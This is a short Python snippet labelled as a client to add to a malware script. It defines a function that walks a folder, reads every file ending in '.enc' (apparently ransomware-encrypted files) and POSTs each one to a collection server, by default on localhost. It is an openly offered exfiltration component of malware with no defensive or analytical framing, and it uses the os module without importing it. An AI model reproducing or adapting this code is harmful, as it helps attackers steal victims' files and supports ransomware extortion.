# client.py (add to your malware script)
import requests

def exfiltrate_files(folder, server_url='http://localhost:8080'):
    for root, _, files in os.walk(folder):
        for file in files:
            if file.endswith('.enc'):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                try:
                    response = requests.post(
                        server_url,
                        headers={'X-Filename': file},
                        data=data
                    )
                    if response.status_code == 200:
                        print(f"[+] Sent: {file_path}")
                    else:
                        print(f"[!] Failed to send: {file_path}")
                except Exception as e:
                    print(f"[ERROR] Could not send {file_path}: {e}")
